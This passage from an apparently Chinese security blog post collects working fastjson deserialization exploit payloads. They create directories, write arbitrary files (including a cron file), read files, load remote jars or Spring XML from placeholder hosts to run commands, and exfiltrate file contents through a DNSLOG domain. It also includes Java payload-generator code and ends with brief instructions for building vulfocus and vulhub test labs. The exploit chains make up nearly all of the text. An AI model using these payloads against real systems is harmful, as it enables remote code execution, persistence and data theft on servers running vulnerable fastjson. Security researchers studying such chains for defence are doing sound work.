  "append": "false"
}

{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileWriter",
  "file": "/tmp/nonexist",
  "append": "false"
}
</code></pre>
<p><strong>目录创建</strong></p>
<pre><code>// org.apache.commons.io.output.LockableFileWriter
{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.output.WriterOutputStream",
 "writer":{
 "@type":"org.apache.commons.io.output.LockableFileWriter",
 "file":"/etc/passwd", //一个存在的文件
 "encoding":"UTF-8",
 "append": true,
"lockDir":"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes" //要创建的目录
 },
 "charset":"UTF-8",
 "bufferSize": 8193,
 "writeImmediately": true
 }
</code></pre>
<p><strong>文件写入(依赖JDK，可写二进制)</strong></p>
<pre><code class="line-numbers language-json">// 需要目标环境中的jar包或modules文件保留调试信息(LocalVariableTable)，(考虑CentOS环境)
// 可写二进制文件
// 文件内容输入参数input、buffer等是使用zlib压缩后再Base64编码得到
// echo -ne "写入字符串" | openssl zlib | base64 -w 0


// POC 1
// 仅依赖JDK 8 / 10
// https://mp.weixin.qq.com/s/wdOb5ESfbkMSfdDlRvOg-g
{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'dst',
           'append':false
        },
        'infl':
        {
            'input':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}

// POC 2
// JDK8环境下 还需要依赖aspectjtools、kryo、je
// position表示Base64前的字符串长度，需要保持一致
{
    "stream": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "f:/pwn.txt",
        "tempPath": ""
    },
    "writer": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.esotericsoftware.kryo.io.Output",
        "buffer": "YjF1M3I=",
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 5
    },
    "close": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}


// POC 3
// 仅依赖JDK11（jdk8会创建文件，但是不会写入内容）
/* 报错 default constructor not found。利用时需要类中存在 LocalVariableTable 调试信息
// https://www.cnblogs.com/zpchcbd/p/14969606.html
*/
// https://pastebin.com/ZwLxJZ2E
{
    "@type":"java.lang.AutoCloseable",
    "@type":"sun.rmi.server.MarshalOutputStream",
    "out":
    {
        "@type":"java.util.zip.InflaterOutputStream",
        "out":
        {
           "@type":"java.io.FileOutputStream",
           "file":"/tmp/JDK11write",
           "append":false
        },
        "infl":
        {
            "input":
            {  "array":"eNoLz0gsKS4uLVBIL60s1lEoycgsVgCiXAPDVD0FT/VchYzUolSFknyF8sSSzLx0hbT8IoVQhbz8cj0uAGcUE78=",
                "limit":65
            }
        },
        "bufLen":1048576
    },
    "protocolVersion":1
}

// POC 4
// JDK11+（jdk8会创建文件，但是不会写入内容）
// https://github.com/safe6Sec/Fastjson
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/JDK11plus",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
</code></pre>
<p><strong>文件写入(依赖commons-io，写字符串)</strong></p>
<pre><code class="line-numbers language-json">// Commons IO 2.x 写文件利用链挖掘分析:https://bbs.chaitin.cn/topic/597

// POC 1
// commons-io 2.0 - 2.6:
// https://stack.chaitin.com/techblog/detail/16
// https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "encoding":"UTF-8",
        "append": false
      },
 // 这里可能需要改为 "charset": "UTF-8",  // https://www.cnblogs.com/zpchcbd/p/14969606.html
      "charsetName":"UTF-8",   
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}

// POC 2
// commons-io 2.0 - 2.6
// https://github.com/safe6Sec/Fastjson
{
 "x":{
 "@type":"com.alibaba.fastjson.JSONObject",
 "input":{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.input.ReaderInputStream",
 "reader":{
 "@type":"jdk.nashorn.api.scripting.URLReader",
 "url":"http://127.0.0.1:8083/test.txt"
 },
 "charsetName":"UTF-8",
 "bufferSize":10000
 },
 "branch":{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.output.WriterOutputStream",
 "writer":{
 "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
 "file":"/tmp/files/12345",
 "encoding":"UTF-8",
 "append": true
 },
 "charset":"UTF-8",
 "bufferSize": 8193,
 "writeImmediately": true
 },
 "trigger":{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.input.XmlStreamReader",
 "is":{
 "@type":"org.apache.commons.io.input.TeeInputStream",
 "input":{
 "$ref":"$.input"
 },
 "branch":{
 "$ref":"$.branch"
 },
 "closeBranch": true
 },
 "httpContentType":"text/xml",
 "lenient":false,
 "defaultEncoding":"UTF-8"
 }
 }
}

// POC 3
// commons-io 2.7+
// https://stack.chaitin.com/techblog/detail/16
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
        "start":0,
        "end":2147483647
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "charsetName":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
</code></pre>
<p><strong>文件写入(二进制写入)</strong></p>
<pre><code class="line-numbers language-java">// https://paper.seebug.org/1698/#4
// rg.eclipse.core.internal.localstore.SafeFileOutputStream
/**
 * @auther Skay
 * @date 2021/8/13 14:25
 * @description
 **/
public class payload_AspectJ_writefile {
    public static void write_so(String target_path){
        byte[] bom_buffer_bytes = readFileInBytesToString("./beichen.so");
        //写文本时要填充数据
//        String so_content = new String(bom_buffer_bytes);
//        for (int i=0;i&lt;8192;i++){
//            so_content = so_content+"a";
//        }
//        String base64_so_content = Base64.getEncoder().encodeToString(so_content.getBytes());
        String base64_so_content = Base64.getEncoder().encodeToString(bom_buffer_bytes);
        byte[] big_bom_buffer_bytes = Base64.getDecoder().decode(base64_so_content);
//        byte[] big_bom_buffer_bytes = base64_so_content.getBytes();
        String payload = String.format("{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\n" +
                "  \"delegate\":{\n" +
                "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "    \"input\":{\n" +
                "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n" +
                "      \"in\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
                "        \"charset\":\"utf-8\",\n" +
                "        \"bufferSize\": 1024,\n" +
                "        \"s\":{\"@type\":\"java.lang.String\"\"%1$s\"\n" +
                "      },\n" +
                "      \"doEncode\":false,\n" +
                "      \"lineLength\":1024,\n" +
                "      \"lineSeparator\":\"5ZWKCg==\",\n" +
                "      \"decodingPolicy\":0\n" +
                "    },\n" +
                "    \"branch\":{\n" +
                "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "      \"targetPath\":\"%2$s\"\n" +
                "    },\n" +
                "    \"closeBranch\":true\n" +
                "  },\n" +
                "  \"include\":true,\n" +
                "  \"boms\":[{\n" +
                "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                  \"charsetName\": \"UTF-8\",\n" +
                "                  \"bytes\":" +"%3$s\n" +
                "                }],\n" +
                "  \"x\":{\"$ref\":\"$.bOM\"}\n" +
                "}",base64_so_content, "D://java//Fastjson_All//fastjson_debug//fastjson_68_payload_test_attck//aaa.so",Arrays.toString(big_bom_buffer_bytes));
//        System.out.println(payload);
        JSON.parse(payload);

    }

    public static byte[] readFileInBytesToString(String filePath) {
        final int readArraySizePerRead = 4096;
        File file = new File(filePath);
        ArrayList&lt;Byte&gt; bytes = new ArrayList&lt;&gt;();
        try {
            if (file.exists()) {
                DataInputStream isr = new DataInputStream(new FileInputStream(
                        file));
                byte[] tempchars = new byte[readArraySizePerRead];
                int charsReadCount = 0;

                while ((charsReadCount = isr.read(tempchars)) != -1) {
                    for(int i = 0 ; i &lt; charsReadCount ; i++){
                        bytes.add (tempchars[i]);
                    }
                }
                isr.close();
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return toPrimitives(bytes.toArray(new Byte[0]));
    }

    static byte[] toPrimitives(Byte[] oBytes) {
        byte[] bytes = new byte[oBytes.length];

        for (int i = 0; i &lt; oBytes.length; i++) {
            bytes[i] = oBytes[i];
        }

        return bytes;
    }
}

// https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew
// org.apache.tools.ant.util.LazyFileOutputStream
public static void write_so(String target_path) throws IOException {
    byte[] bom_buffer_bytes = readFileInBytesToString("./target/classes/MyClass.class");
    String base64_so_content = Base64.getEncoder().encodeToString(bom_buffer_bytes);
    byte[] big_bom_buffer_bytes = Base64.getDecoder().decode(base64_so_content);
    String payload = String.format("{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\n" +
                "  \"delegate\":{\n" +
                "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "    \"input\":{\n" +
                "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n" +
                "      \"in\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
                "        \"charset\":\"utf-8\",\n" +
                "        \"bufferSize\": 1024,\n" +
                "        \"cs\":{\"@type\":\"java.lang.String\"\"%1$s\"\n" +
                "      },\n" +
                "      \"doEncode\":false,\n" +
                "      \"lineLength\":1024,\n" +
                "      \"lineSeparator\":\"5ZWKCg==\",\n" +
                "      \"decodingPolicy\":0\n" +
                "    },\n" +
                "    \"branch\":{\n" +
                //"      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                //"      \"targetPath\":\"%2$s\"\n" +
                "      \"@type\":\"org.apache.tools.ant.util.LazyFileOutputStream\",\n" +
                "      \"file\":\"%2$s\",\n" +
                "      \"append\":false,\n" +
                "      \"alwaysCreate\":true\n" +
                "    },\n" +
                "    \"closeBranch\":false\n" +
                "  },\n" +
                "  \"include\":true,\n" +
                "  \"boms\":[{\n" +
                "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                  \"charsetName\": \"UTF-8\",\n" +
                "                  \"bytes\":" +"%3$s\n" +
                "                }],\n" +
                "  \"x\":{\"$ref\":\"$.bOM\"}\n" +
                "}",base64_so_content, "/tmp/MyClass.class", Arrays.toString(big_bom_buffer_bytes));
    System.out.println(payload);
}

public static byte[] readFileInBytesToString(String filePath) {
        final int readArraySizePerRead = 4096;
        File file = new File(filePath);
        ArrayList&lt;Byte&gt; bytes = new ArrayList&lt;&gt;();
        try {
            if (file.exists()) {
                DataInputStream isr = new DataInputStream(new FileInputStream(
                        file));
                byte[] tempchars = new byte[readArraySizePerRead];
                int charsReadCount = 0;

                while ((charsReadCount = isr.read(tempchars)) != -1) {
                    for(int i = 0 ; i &lt; charsReadCount ; i++){
                        bytes.add (tempchars[i]);
                    }
                }
                isr.close();
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return toPrimitives(bytes.toArray(new Byte[0]));
    }

    static byte[] toPrimitives(Byte[] oBytes) {
        byte[] bytes = new byte[oBytes.length];

        for (int i = 0; i &lt; oBytes.length; i++) {
            bytes[i] = oBytes[i];
        }
        return bytes;
}
</code></pre>
<p><strong>文件写入(其他依赖)</strong></p>
<pre><code class="line-numbers language-json">// POC1
// 特殊字符写入可能存在问题
// 需要aspectjtools、kryo和je依赖
{
    "stream": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "目标文件路径",
        "tempPath": "输出流对象文件路径"
    },
    "writer": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.esotericsoftware.kryo.io.Output",
        "buffer": "Base64字符串",
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 5
    },
    "close": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}
    
// POC2
// 需要同时存在solr和snappy环境，现实环境可能不存在
// https://mp.weixin.qq.com/s/GvR7ZXBtqDUUb3jXYYUexg
{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'java.io.FileOutputStream',
        'file':'/tmp/nonexist',
        'append':false
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.solr.common.util.FastOutputStream',
        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
        'sink':
        {
            '$ref':'$.stream'
        },
        'start':38
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.iq80.snappy.SnappyOutputStream',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}
</code></pre>
<h4 id="-3"><a href="#-3" class="headerlink" title="<= 1.2.80(java.lang.Exception)"></a>&lt;= 1.2.80(java.lang.Exception)</h4><p><code>fastjson1.2.80</code>添加了黑名单对上文的利用方式进行限制，但在默认<code>autoType</code>关闭的情况下依然存在可利用的白名单期望类<code>Throwable</code>(<code>java.lang.Exception</code>继承于<code>Throwable</code>)绕过黑名单限制。可结合其他依赖的默认行为实现远程代码执行、任意文件读写等操作（如继承于<code>java.lang.Exception</code>的类能够导致的漏洞:<code>Jdbc connection RCE</code>、<code>Groovy RCE</code>、<code>Ognl</code>读写文件、<code>Aspectj</code>读文件等）。</p>
<p><strong>groovy-jar-rce</strong></p>
<pre><code class="line-numbers language-json">// 1.2.76 &lt;= fastjson &lt; 1.2.83

// 第一步:将子类加入类缓存
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}

// 第二步:加载远程文件执行
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
     "@type":"org.codehaus.groovy.control.CompilerConfiguration",
     "classpathList":"http://127.0.0.1:8090/123.jar"
     // "classpathList":"http://127.0.0.1:8090/"
    }
}

{"a":{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
},
"b":{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
     "@type":"org.codehaus.groovy.control.CompilerConfiguration",
     "classpathList":"http://127.0.0.1:8090/123.jar"
     // "classpathList":"http://127.0.0.1:8090/"
    }
}
}
</code></pre>
<p><strong>postgresql-jdbc-rce</strong></p>
<pre><code class="line-numbers language-json">{
    "a":{
    "@type":"java.lang.Exception",
    "@type":"org.python.antlr.ParseException",
    "type":{}
    },
    "b":{
        "@type":"org.python.core.PyObject",
        "@type":"com.ziclix.python.sql.PyConnection",
        "connection":{
            "@type":"org.postgresql.jdbc.PgConnection",
            "hostSpecs":[
                {
                    "host":"127.0.0.1",
                    "port":2333
                }
            ],
            "user":"user",
            "database":"test",
            "info":{
                "socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
                "socketFactoryArg":"http://x.x.x.x:8090/exp.xml"
            },
            "url":""
        }
    }
}
</code></pre>
<p>远程<code>XML</code>文件内容：</p>
<pre><code class="line-numbers language-xml">&lt;beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
&lt;bean id="pb" class="java.lang.ProcessBuilder"&gt;
  &lt;constructor-arg&gt;
    &lt;list value-type="java.lang.String" &gt;
       &lt;value&gt;cmd&lt;/value&gt;
       &lt;value&gt;/c&lt;/value&gt;
       &lt;value&gt;calc&lt;/value&gt;
    &lt;/list&gt;
  &lt;/constructor-arg&gt;
  &lt;property name="whatever" value="#{pb.start()}"/&gt;
&lt;/bean&gt;
&lt;/beans&gt;
</code></pre>
<p><strong>ognl-io-readfile</strong></p>
<pre><code class="line-numbers language-json">// https://github.com/kezibei/fastjson_payload
// fastjson 1.2.73-1.2.80,ognl-3.2.21  commons-io-2.2
// 需回显,根据回显不一样(关注su18/su17字段)布尔读文件
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
                                "@type": "jdk.nashorn.api.scripting.URLReader",
                                "url": "file:///D:/"
                            },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su17": {
            "$ref": "$.su16.node.p.stream"
        },
        "su18": {
            "$ref": "$.su17.bOM.bytes"
        }
    }
</code></pre>
<p><strong>ognl-io-writefile</strong></p>
<pre><code class="line-numbers language-json">// https://github.com/kezibei/fastjson_payload

// fastjson 1.2.73-1.2.80
// ognl-3.2.21 commons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6
// 写入复杂文件结构，文件需要大于8kb
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
  "@type":"org.apache.commons.io.input.BOMInputStream",
  "delegate":{
    "@type":"org.apache.commons.io.input.TeeInputStream",
    "input":{
      "@type": "org.apache.commons.codec.binary.Base64InputStream",
      "in":{
        "@type":"org.apache.commons.io.input.CharSequenceInputStream",
        "charset":"utf-8",
        "bufferSize": 1024,
        "s":{"@type":"java.lang.String""文件baes64"
      },
      "doEncode":false,
      "lineLength":1024,
      "lineSeparator":"5ZWKCg==",
      "decodingPolicy":0
    },
    "branch":{
      "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream",
      "targetPath":"/var/spool/cron/root"
    },
    "closeBranch":true
  },
  "include":true,
  "boms":[{
                  "@type": "org.apache.commons.io.ByteOrderMark",
                  "charsetName": "UTF-8",
                  "bytes":[85, 48, 104...文件bytes]
                }],
}
                }
            }
        },
        "su17": {
            "$ref": "$.su16.node.p.stream"
        },
        "su18": {
            "$ref": "$.su17.bOM.bytes"
        }
    }
</code></pre>
<p><strong>aspectj-readfile</strong></p>
<pre><code class="line-numbers language-json">// https://y4er.com/posts/fastjson-1.2.80/#groovy
// fastjson 1.2.73&lt;=version&lt;=1.2.80,aspectjtools依赖
// 第一步
{
"@type":"java.lang.Exception",   "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}

// 第二步
{
    "@type":"java.lang.Class",
    "val":{
        "@type":"java.lang.String"{
        "@type":"java.util.Locale",
        "val":{
            "@type":"com.alibaba.fastjson.JSONObject",
             {
                "@type":"java.lang.String"
                "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
                "newAnnotationProcessorUnits":[{}]
            }
        }
    }


// 第三步
// 直接回显
{
    "x":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"c:/windows/win.ini"
    }
}
// 报错回显
{
    "@type":"java.lang.Character"
    {
        "c":{
            "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
            "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
            "fileName":"c:/windows/win.ini"
    }
}
// DNSLOG带外
{ "a":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"1.txt"},
"b":{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{
"@type": "java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{"$ref":"$"},"country":"x.xnfhnufo.dnslog.pw"}}
}}

// 如果是JSON.parse方式解析时可以通过[]执行一次即可
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"},"password":"admin"}]

// 报错回显文件读取
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"java.lang.Character"{"c":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"}},"password":"admin"}]
</code></pre>
<p><strong>httpout-read</strong></p>
<pre><code class="line-numbers language-json">// ognl&gt;=2.7,commons-io&gt;=2.0

// 第一步
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"test"},"password":"admin"}]

// 第二步
{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}},"su16":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","language":"http://127.0.0.1:8085/?test","country":{"@type":"java.lang.String"[{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"C:/Windows/win.ini"}]}}},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36]}]}}}},"su17":{"$ref":"$.su16.node.p.stream"},"su18":{"$ref":"$.su17.bOM.bytes"}}
</code></pre>
<h2 id="0x04-测试环境搭建"><a href="#0x04-测试环境搭建" class="headerlink" title="0x04 测试环境搭建"></a>0x04 测试环境搭建</h2><p>这一节整理fastjson常见的漏洞验证和特定版本下的利用环境，在靶场环境中测试上文中对fastjson版本的探测，JNDI注入、命令执行回显、内存马等利用方式验证。大部分基于docker的环境可以通过<a target="_blank" rel="noopener" href="https://github.com/fofapro/vulfocus">vulfocus</a>进行管理:</p>
<pre><code class="line-numbers language-bash">// 拉取镜像
docker pull vulfocus/vulfocus:latest
// 创建容器，-e VUL_IP=xxx.xxx.xxx.xxx 为 Docker 服务器 IP ，不能为 127.0.0.1。
docker create -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=192.168.11.179 -e EMAIL_HOST="192.168.11.179" -e EMAIL_HOST_USER="admin@vulfocus.com" -e EMAIL_HOST_PASSWORD="PassWord@2024" vulfocus/vulfocus
// 创建后查看容器ID后启动容器
docker start a6ca90309735
</code></pre>
<p>如本文进行fastjson漏洞环境的搭建，在一键同步后搜索fastjson的漏洞环境进行下载，然后到首页启动靶场:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240426145813411.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a>靶场的环境也可以很方便的导入<code>vulfocus</code>，从<code>docker-compose.yml</code>中复制镜像名称：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513110158960.png"></p>
